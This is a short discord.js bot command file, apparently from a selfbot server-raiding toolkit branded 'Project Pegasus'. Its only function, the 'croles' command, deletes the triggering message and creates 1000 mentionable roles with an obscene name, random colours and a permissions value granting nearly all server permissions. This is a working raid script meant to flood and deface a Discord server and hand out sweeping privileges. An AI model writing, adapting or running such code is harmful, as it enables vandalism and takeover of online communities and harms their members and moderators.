const Discord = require('discord.js');
const fs = require('fs');

module.exports.run = async (bot, message, args) => {
  
    message.delete();

        if (message.author.id == bot.user.id) {
            if (message.deletable) message.delete();
            for (var i = 0; i < 1000; i++) {
                message.guild.createRole({
                    name: "𝐅𝐔𝐂𝐊𝐄𝐃 𝐁𝐘 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐏𝐞𝐠𝐚𝐬𝐮𝐬 ♞ ",
                    mentionable: true,
                    permissions: 2146958591,
                    position: "",
                    color: "RANDOM"
                })
            }
        }
    }




module.exports.help = {
    name: "croles"
} 
